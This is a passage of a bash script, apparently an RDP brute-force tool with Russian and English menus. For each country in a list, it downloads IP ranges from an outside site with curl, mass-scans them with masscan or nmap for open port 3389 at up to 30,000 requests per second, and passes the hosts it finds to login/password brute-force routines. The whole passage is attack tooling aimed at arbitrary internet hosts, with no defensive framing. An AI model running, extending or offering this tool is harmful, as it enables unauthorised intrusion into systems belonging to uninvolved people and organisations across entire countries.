curl http://ipdiapazon.16mb.com/Ukraine.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "192" ]; then
curl http://ipdiapazon.16mb.com/United.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "193" ]; then
curl http://ipdiapazon.16mb.com/United_kingdom.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "194" ]; then
curl http://ipdiapazon.16mb.com/United_states.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "195" ]; then
curl http://ipdiapazon.16mb.com/Uruguay.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "196" ]; then
curl http://ipdiapazon.16mb.com/Uzbekistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "197" ]; then
curl http://ipdiapazon.16mb.com/Vanuatu.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "198" ]; then
curl http://ipdiapazon.16mb.com/Venezuela.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "199" ]; then
curl http://ipdiapazon.16mb.com/Viet_nam.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "200" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU

else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "201" ]; then
curl http://ipdiapazon.16mb.com/Virgin_islands_u.s.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "202" ]; then
curl http://ipdiapazon.16mb.com/Yemen.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g" > list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list  --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU


else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "203" ]; then
curl http://ipdiapazon.16mb.com/Zambia.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""





echo ""
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"

echo ""
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
else
clear
echo -e "$aquamarine                                             Получаем список IP"
echo ""


if [ "$country"  = "204" ]; then
curl http://ipdiapazon.16mb.com/Zimbabwe.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green*Диапазон IP сохранен в файл $red $PWD/list. $colorbase"
echo -e  "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                  Проверяем на наличие открытых RDP портов."



echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $colorbase"
trap 'echo "Выход в Главное меню"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""

rate_f () {
read -p "Масимальное количество запросов в секунду {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "Значение rate установлено $rate$green"
echo ""

break
		
		else		
echo -e "$red                                     Значение должно быть от 120 до 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL list --open-only --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
CHECKFILERU



echo -e "$green*Хосты с открытым RDP портом записаны в файл $red $PWD/open3389 $colorbase"


echo ""

echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                    Приступаем к перебору логин/пароль "
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENURU
if [ "$menuoption" = "5" ]; then

CLEARALL
exit;
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
}
########################################################MENUENG####################################
MENUENG ()
{
echo -e "$aquamarine            ************************************Main menu**********************************$colorbase";
echo ""
echo -e "               +-----------------------------------------------------------------------+"
echo -e "               |        $grey 1.$yellow Scan range to find an open RDP port (manual entry)$colorbase         | ";
echo -e "               |        $grey 2.$yellow Scan range to find an open RDP port (from a file)$colorbase          | ";
echo -e "               |        $grey 3.$yellow Bruteforce Username/Password (last scan)$colorbase                   | ";
echo -e "               |        $grey 4.$yellow Selecting the range of IP for the country $colorbase                 | ";
echo -e "               |        $grey 5.$yellow Exit ($red[ENTER]$yellow) $colorbase                                            | ";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                          Сhoose from a menu : " menuoption

if [ "$menuoption" = "1" ]; then
echo -e "$red--------------------------------------------------------------------------------------------------------$aquamarine"
read -p "Enter the range or single IP {x.x.x.x/24,x.x.x.0-x.x.x.255} : " target

echo -e " $colorbase              +-----------------------------------------------------------------------+"   
echo -e "               |   $grey                      1.$yellow Nmap (Single IP)$colorbase                           |";
echo -e "               |   $grey                      2.$yellow Masscan$colorbase                                    |";
echo -e "               +-----------------------------------------------------------------------+"
read -p "                                            Select scanner : " scan
clear
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode $red'CTRL+C'$colorbase"
if [ "$scan" = "1" ]; then
nmap -Pn -sS $target -p $port --open  | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

	else
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done


masscan $target -p $port --open-only  --max-rate $rate | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
fi
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

echo ""
echo -e "$aquamarine                             Addresses open RDP port:$green"
cat open3389
echo ""
echo -e "Hosts open port 3389 written to the file $red $PWD/open3389$colorbase"
echo ""
sleep 2
clear
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else

if [ "$menuoption" = "2" ]; then
echo -e "$aquamarine*******************************************************************************$green"
read -p "*Enter the path to the file {list.txt,list..& etc.} : " listname

clear
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"
echo -e "$yellow*To exit the scan mode $red'CTRL+C'$colorbase"


rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
echo -e "The rate is set to $rate$green"
echo ""

break
		
		else		
echo -e "$red                                 The value must be between 120 and 30000$colorbase"
echo ""
sleep 1.7
clear
fi
done

masscan -p $port -iL listname --open-only --max-rate $rate| grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389


trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
CHECKFILEEN

echo ""
echo -e "$aquamarine                            Addresses open RDP port:$green" 
cat open3389
echo ""
echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
echo ""
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else

if [ "$menuoption" = "3" ]; then
echo ""
clear
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"    
echo -e "$aquamarine                                 Getting brute force username/password... "
echo -e "$red-------------------------------------------------------------------------------------------------------$colorbase"



MAINBRUTEMENUEN
else
if [ "$menuoption" = "4" ]; then
COUNTRYLIST
trap 'echo ""; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2
echo ""
read -p "                                 Choose the country {1/2/3/& etc.}: " country
clear

echo -e "$aquamarine                                            Get a list of IP"
echo ""
if [ "$country"  = "1" ]; then
curl http://ipdiapazon.16mb.com/Afghanistan.html |grep -E  "([0-9]{1,3}[\.]){3}[0-9]{1,3}" |sed "s/ //g">list
echo -e "$red---------------------------------------------------------------------------------------------------------$green"
cat list
echo -e "$red---------------------------------------------------------------------------------------------------------$colorbase"
echo ""
echo -e "$green The IP range is saved in the file $red $PWD/list. $colorbase"

echo ""
echo -e "$red--------------------------------------------------------------------------------------------------------$colorbase"
echo -e "$aquamarine                                              Search open RDP.$colorbase"
echo -e "$red--------------------------------------------------------------------------------------------------------$green"

echo ""
echo -e "$yellow*To exit the scan mode$red'CTRL+C' $colorbase"
trap 'echo "Return to Main Menu"; ./src/rdp_brute.sh; exit; ./rdp_brute.sh' 2

echo ""
rate_f () {
read -p "Maximum number of requests per second {120-30000} : " raten
echo ""
rate=$(echo $raten | sed -e 's/[^0-9]//g')
}
while rate_f
do
	if [[ $rate -gt 119 && $rate -lt 30001 ]];
		then
